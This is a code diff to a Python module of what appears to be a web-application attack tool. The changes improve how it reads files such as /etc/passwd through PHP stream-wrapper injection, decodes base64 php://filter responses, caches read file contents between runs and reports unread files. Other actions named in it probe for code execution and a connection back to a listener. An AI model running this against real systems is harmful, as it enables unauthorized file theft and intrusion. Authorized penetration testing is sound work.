@@ -20,11 +20,13 @@ marker this run invented, or a connection back to the listener.
 from __future__ import annotations
 
 import base64
+import binascii
+import re
 import secrets
 
 from ...core.filters import php_runner
 from ...core.mutate import Kind, Variant
-from ...engine.blackboard import Confidence
+from ...engine.blackboard import READ_FACT_PREFIX, Confidence
 from ...engine.evidence import Judge, Verdict
 from ...engine.filterprobe import probe_filter, probe_without_agent
 from ...engine.inject import (
@@ -77,14 +79,27 @@ def _remote_wrappers() -> list[Wrapper]:
 
 
 def _file_targets(ctx: RunContext) -> list[str]:
-    configured = ctx.config.get("read") or []
-    return list(configured) or list(FILE_TARGETS)
+    """Files to ask for: the ones the operator named, then the usual ones.
+
+    Naming a file is not a reason to stop asking whether the parameter is
+    injectable at all. A file the application cannot read is a common answer -
+    apache writes its own logs `640 root:adm` - and a run that only ever asked
+    for that one file ends by reporting no wrapper produced evidence, which reads
+    as "not vulnerable" for a parameter that is.
+    """
+    named = list(ctx.config.get("read") or [])
+    return named + [target for target in FILE_TARGETS if target not in named]
 
 
-def _targets_for(wrapper: Wrapper, targets: list[str]) -> list[str]:
+def _targets_for(wrapper: Wrapper, targets: list[str], named=()) -> list[str]:
     """Which paths to ask this wrapper for.
 
-    A wrapper that reads through a scheme can be asked for a file the
+    A file the operator named is asked for, all of them and first: the flag says
+    repeatable and each one was named for a reason, so a list of two absolute
+    paths is two questions rather than one.
+
+    The rest is the probe's own choice of files, and there one of each kind is
+    enough. A wrapper that reads through a scheme can be asked for a file the
     application serves and for one the system owns, and the two answer different
     questions: reading the application's own page proves the wrapper resolves,
     reading the password file proves it reaches outside. Asking only one of them
@@ -98,28 +113,28 @@ def _targets_for(wrapper: Wrapper, targets: list[str]) -> list[str]:
     of `root:x`, in that same list - describes a file that was never requested.
     The read worked and the run reported no evidence.
 
-    So a scheme wrapper gets one path of each kind, most likely first. Which kind
-    comes first is its own signature list's business: a wrapper that names a
-    system file is asked for one first.
+    Which kind comes first is the wrapper's own signature list's business: a
+    wrapper that names a system file is asked for one first.
     """
     if not targets:
         return []
-    absolute = [t for t in targets if t.startswith("/")]
-    relative = [t for t in targets if not t.startswith("/")]
+    asked = [target for target in targets if target in named]
+    rest = [target for target in targets if target not in named]
+
+    absolute = [t for t in rest if t.startswith("/")]
+    relative = [t for t in rest if not t.startswith("/")]
 
     if wrapper.family in _SYSTEM_FAMILIES:
-        return (absolute or targets)[:1]
+        return asked + (absolute or rest)[:1]
     if "://" not in wrapper.payload:
-        if absolute:
-            return absolute[:1]
-        return targets[:1]
+        return asked + ((absolute or rest)[:1] if absolute else rest[:1])
 
     order = (absolute, relative) if _names_a_system_file(wrapper) else (relative, absolute)
     picked: list[str] = []
     for group in order:
         if group and group[0] not in picked:
             picked.append(group[0])
-    return picked or targets[:1]
+    return asked + (picked or rest[:1])
 
 
 # Markers that describe a file the system owns rather than one the application
@@ -224,18 +239,91 @@ def _path_of(payload: str) -> str:
     return ""
 
 
+# What an operator asked for by name, and the answer that came back.
+#
+# The session remembers that the read action ran on this page, and that is the
+# right thing to skip - but "a file was read here once" is not the file, and a
+# second run that skips the action has the payload to show and nothing else.
+# What is kept instead is the answer to the question, so a later run re-asks it
+# and gets the same file back without spending a request. That is the shape the
+# session already uses for everything else it learned: what was found, keyed by
+# what it was found by.
+#
+# The prefix is the board's, because the board is what renders a result: this
+# module decides which files are worth reading, and the summary decides how a
+# file that was read is shown.
+REMEMBERED_READ = READ_FACT_PREFIX
+
+
+def _remembered_read(ctx: RunContext, path: str) -> str:
+    if not path:
+        return ""
+    value = ctx.blackboard.get(REMEMBERED_READ + path)
+    return value if isinstance(value, str) else ""
+
+
+def _remember_read(ctx: RunContext, path: str, content: str) -> None:
+    if path and content:
+        ctx.blackboard.set(
+            REMEMBERED_READ + path,
+            content,
+            evidence="the file an earlier run read, kept so a later one need not ask again",
+            confidence=Confidence.CONFIRMED,
+        )
+
+
+# A base64 run, four characters at least, so that padding and short files are
+# included. Only used where the wrapper has already said the answer is encoded.
+_BASE64_RUN = re.compile(rb"[A-Za-z0-9+/]{4,}={0,2}")
+
+
+def _decoded_file(body: str) -> str:
+    """The file, decoded the way the payload asked for it.
+
+    A wrapper whose payload is `php://filter/convert.base64-encode` answers with
+    the file in base64 - that is what it does, and the tool built the payload, so
+    it does not have to infer the encoding from the shape of the response.
+
+    That is why there is no minimum length here. The judge's decoder looks for
+    blobs long enough to be worth decoding in an ordinary page, and a threshold
+    chosen for that is far too high for a file: measured, `/etc/hostname` came
+    back as `NDg4YTA1NWI0ZTZjCg==`, twenty characters, and `--read` reported the
+    file as not read while the response was carrying it.
+    """
+    raw = body.encode("latin-1", "replace")
+    candidates: list[str] = []
+    for blob in _BASE64_RUN.findall(raw):
+        try:
+            decoded = base64.b64decode(blob + b"=" * (-len(blob) % 4), validate=True)
+        except (binascii.Error, ValueError):
+            continue
+        text = decoded.decode("utf-8", "replace")
+        if text and all(char.isprintable() or char in "\r\n\t" for char in text):
+            candidates.append(text)
+    if not candidates:
+        return ""
+    # A reading that is not in the response had to be decoded to exist, which is
+    # the file rather than a word of the page that happens to be valid base64.
+    fresh = [text for text in candidates if text not in body]
+    return max(fresh or candidates, key=len)
+
+
 def _named_file_contents(wrapper: Wrapper, body: str, payload: str) -> str:
     """The file itself, out of the page that carried it.
 
     A read that is proved and not shown is half a result: the operator asked for
-    a file and the tool answers that it could be read. The views are the same
-    ones the verdict was based on, so what is printed is what the finding rests
-    on rather than a second, differently-decoded copy of the response.
+    a file and the tool answers that it could be read. And a read is a result, so
+    the same work decides what the file is - which is why the wrapper's own
+    encoding is used rather than a second, differently-guessed decoding of the
+    response.
 
     Only for a file the operator named. The probe's own reads are about whether a
     wrapper works, and printing the application's page at whoever ran it is noise.
     """
     cleaned = Judge.strip_payload(body.encode("latin-1", "replace"), payload)
+    if wrapper.decoded:
+        return _decoded_file(cleaned.decode("latin-1", "replace"))
+
     raw = cleaned.decode("latin-1", "replace")
     views = [v for v in Judge.decoded_views(cleaned) if len(v) > 8 and "<html" not in v.lower()]
     # A view that does not appear in the response is one that had to be decoded
@@ -274,13 +362,18 @@ def _proven(
     _note_finding(ctx, entry)
     _record(ctx, WRAPPERS, wrapper.name, evidence=note or verdict.reason, confidence=Confidence.CONFIRMED)
 
-    # A file the operator named is what they asked for, so they get to see it.
+    # A file the operator named is what they asked for, so they get to see it -
+    # and it is kept, so the next run can show it again from what was learned
+    # rather than from what it spent.
     if ctx.config.get("read") and body:
         shown = _named_file_contents(wrapper, body, variant.value)
         if shown:
-            ctx.emit(f"  [+] {_path_of(variant.value) or variant.value}:")
-            for line in shown.splitlines()[:40]:
-                ctx.emit(f"      {line}")
+            path = _path_of(variant.value) or variant.value
+            _remember_read(ctx, path, shown)
+            # What was read, not what it said, and once. The file itself goes in
+            # the result at the end, where the answer belongs - not once for
+            # every wrapper that turned out to reach it.
+            ctx.announce(f"read.{path}", f"  [+] read {path}")
 
     # A file that was read says where files live, and whoever writes one next
     # needs that. Only reads count: a `data://` payload has no path in it, and
@@ -314,7 +407,29 @@ def _try_wrapper(ctx: RunContext, param, wrapper: Wrapper, action: str, targets:
     costs one request instead of a dozen rewrites, and the families further down
     the list get their turn before the budget is spent on the first one.
     """
-    for target in _targets_for(wrapper, targets):
+    # The files the operator named, if any. Every one of them is a question, so
+    # reaching one is not an answer to the others: a run that stopped at the
+    # first success and then reported the rest as "not read" is wrong about why.
+    asked = tuple(ctx.config.get("read") or ())
+    answered = False
+
+    # A question that was already answered is not asked again, and that applies
+    # to the whole wrapper rather than to one of the paths it would have tried.
+    # The session remembers that this page was probed; what it did not remember
+    # was the file, so a run that re-entered the action to show it went and
+    # re-probed everything else on the way. Measured: twenty-eight requests for
+    # an answer the session already held.
+    for target in targets:
+        remembered = _remembered_read(ctx, target)
+        if remembered:
+            ctx.announce(
+                f"read.{target}", f"  [+] read {target} (resumed from an earlier run)"
+            )
+            answered = True
+    if answered:
+        return True
+
+    for target in _targets_for(wrapper, targets, asked):
         payload = wrapper.payload.format(file=target)
         if escalate:
             outcome = _inject_escalating(ctx, param, payload, action, kind=Kind.PROTOCOL)
@@ -347,8 +462,14 @@ def _try_wrapper(ctx: RunContext, param, wrapper: Wrapper, action: str, targets:
         if not verdict.confirmed:
             continue
         _proven(ctx, wrapper, param, variant, request, verdict, body=exchange.response.text)
+        answered = True
+        if target in asked and not all(_remembered_read(ctx, one) for one in asked):
+            # More named files to get. The wording of a "not read" line has to be
+            # true, and stopping here would make it say a file was unreadable
+            # when nobody asked for it yet.
+            continue
         return True
-    return False
+    return answered
 
 
 # --------------------------------------------------------------------- actions
@@ -776,6 +897,23 @@ def report_summary(ctx: RunContext) -> None:
     else:
         ctx.emit("[-] result: no wrapper produced evidence on this target")
 
+    # A file the operator named that did not come back is its own answer, and it
+    # is not the same answer as "nothing here works" - so it is said either way.
+    # Saying only the second is how a parameter that is injectable gets written
+    # off because the one path asked for happened to be unreadable; saying only
+    # the first is how the operator never learns the file they came for is not
+    # there.
+    missed = [path for path in (ctx.config.get("read") or []) if not _remembered_read(ctx, path)]
+    if missed:
+        note = f"    not read: {', '.join(missed)}"
+        if not proven:
+            note += (
+                ". A file the application cannot read, or one that is not there, says "
+                "nothing about whether the parameter is injectable - the usual files "
+                "were asked as well, and none of them answered"
+            )
+        ctx.emit(note)
+
     if refusals:
         ctx.emit(f"  filter: {refusals} requests were refused")
         if not proven:
@@ -794,7 +932,16 @@ def build_graph(name: str = "proto") -> StateGraph:
             description="what this parameter will accept, and what it will give back",
             actions=[
                 Action("filter.probe", "find out whether anything is filtering", probe_filter_action),
-                Action("probe.read", "read a file through every wrapper that can", probe_read),
+                Action(
+                    "probe.read",
+                    "read a file through every wrapper that can",
+                    probe_read,
+                    # A file the operator named is a request for its contents, and
+                    # a cached "this page was read once" is not those contents.
+                    # Skipping it is how `--read /etc/passwd` answers with the
+                    # payload it would have used and nothing else.
+                    wanted="read",
+                ),
                 Action("probe.webroot", "read the server's configuration for where it serves", probe_webroot),
                 Action("probe.code", "ask the target to run something", probe_code),
                 Action("probe.archive", "reach a file through a container", probe_archive),
